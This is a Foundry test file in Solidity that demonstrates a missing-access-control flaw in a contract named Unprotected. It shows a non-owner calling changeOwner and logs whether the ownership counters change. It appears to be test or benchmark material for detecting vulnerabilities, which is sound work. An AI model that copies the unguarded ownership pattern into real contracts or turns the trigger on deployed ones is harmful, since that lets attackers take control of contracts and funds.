// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/unprotected0.sol";

contract UnprotectedNoPauseTest is Test {
    Unprotected public target;
    address public constant owner = address(0x123);
    address public constant user = address(0x456);
    address public constant newOwner = address(0x789);

    function setUp() public {
        vm.startPrank(owner);
        target = new Unprotected();
        vm.stopPrank();
    }

    function testCriticalFunctionsAlwaysCallable() public {
        // Owner can call critical functions without pause restrictions
        vm.prank(owner);
        target.recordOwnershipActivity();

        // Ownership transfer remains possible without pause
        vm.prank(owner);
        target.changeOwner(newOwner); // This triggers state changes in counters

        console.log("--- BEFORE-Trigger NonOwnerChange ---");
        // Query state before non-owner call
        uint256 totalChangesBefore = target.totalOwnershipChanges();
        uint256 changesByAddrBefore = target.ownershipChangesByAddress(address(0x111));
        console.log("Total Ownership Changes (before):", totalChangesBefore);
        console.log("Ownership Changes for 0x111 (before):", changesByAddrBefore);

        console.log("");
        console.log("--- Trigger NonOwnerChange ---");
        // Non-owner calls protected critical function (vulnerability trigger)
        vm.prank(user);
        target.changeOwner(address(0x111));
        console.log("Non-owner called changeOwner(address(0x111))");

        console.log("--- AFTER-Trigger NonOwnerChange ---");
        // Query state after non-owner call
        uint256 totalChangesAfter = target.totalOwnershipChanges();
        uint256 changesByAddrAfter = target.ownershipChangesByAddress(address(0x111));
        console.log("Total Ownership Changes (after):", totalChangesAfter);
        console.log("Ownership Changes for 0x111 (after):", changesByAddrAfter);

        console.log("");
        // Verify state changes
        bool totalIncreased = (totalChangesAfter == totalChangesBefore + 1);
        bool addrCountIncreased = (changesByAddrAfter == changesByAddrBefore + 1);
        console.log("Total changes increased by 1:", totalIncreased ? "YES" : "NO");
        console.log("Changes for 0x111 increased by 1:", addrCountIncreased ? "YES" : "NO");

        // Final vulnerability verdict
        if (totalIncreased && addrCountIncreased) {
            console.log("Vulnerability Exists: Non-owner successfully modified critical state variables");
        } else {
            console.log("Vulnerability not Exist: State change verification failed");
        }
    }
}